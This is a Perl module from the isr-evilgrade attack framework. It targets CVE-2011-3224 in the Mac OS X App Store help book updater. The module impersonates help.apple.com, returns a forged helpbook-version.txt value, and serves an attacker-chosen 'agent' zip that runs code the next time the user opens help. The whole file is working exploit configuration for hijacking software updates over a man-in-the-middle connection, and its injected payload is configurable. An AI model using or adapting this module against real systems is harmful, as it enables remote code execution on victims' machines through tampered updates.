###############
# appstore.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::appstore;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'    => 'appstore',
    'version' => '1.0',
    'appver'  => '< Mac OS X v10.6.*',
    'author'  => ['Francisco Amato < famato +[AT]+ faradaysec.com >'],
    'description' =>
        qq{CVE: CVE-2011-3224 Found By: Aaron Sigel and Brian Mastenbrook
            The agent have a modification in Resources/scripts/updatefrontend.py to open a Chess application
            look for the comment evilgrade.
            The code is execute the next time the user open the help book, more information:
            http://vttynotes.blogspot.com/2011/10/cve-2011-3224-mitm-to-rce-with-mac-app.html},
    'vh'      => '(help.apple.com)',
    'request' => [
        {   'req'    => 'helpbook-version.txt',    #regex friendly
            'type'   => 'string',                  #file|string|agent|install
            'method' => '',                        #any
            'bin'    => 0,
            'string' => '324071169.795686',
            'parse'  => 0,
            'file'   => '',
        },

        {   'req'    => '.zip',                    #regex friendly
            'type'   => 'agent',                   #file|string|agent|install
            'method' => '',                        #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },

    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/helpbook.zip', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
